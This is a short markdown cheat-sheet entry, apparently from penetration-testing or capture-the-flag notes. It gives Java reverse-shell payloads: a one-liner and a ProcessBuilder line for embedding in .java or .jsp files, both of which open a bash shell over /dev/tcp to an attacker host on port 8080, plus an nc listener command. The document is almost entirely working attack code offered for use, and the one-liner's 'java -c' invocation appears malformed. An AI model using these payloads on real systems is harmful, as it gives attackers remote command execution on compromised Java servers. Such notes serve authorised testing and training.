# Java Reverse Shell

A reverse shell payload using Java.

Used on: **<Machine>**

## One-liner

<!-- cmd: linux -->
```bash
java -c 'public class RevShell { public static void main(String[] args) throws Exception { java.lang.Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "exec 5<>/dev/tcp/$LHOST/8080;cat <&5 | while read line; do $line 2>&5 >&5; done"}).waitFor(); } }'
```

## Java Application Code

If you need to embed this in a `.java` or `.jsp` file:

```java
Process p = new ProcessBuilder("/bin/bash", "-c", "exec 5<>/dev/tcp/10.0.0.1/8080;cat <&5 | while read line; do $line 2>&5 >&5; done").redirectErrorStream(true).start();
```

## Listener

<!-- cmd: linux -->
```bash
nc -lvnp 8080
```

## Notes

- Useful if you have code execution in a Java environment (e.g. Tomcat, Spring).
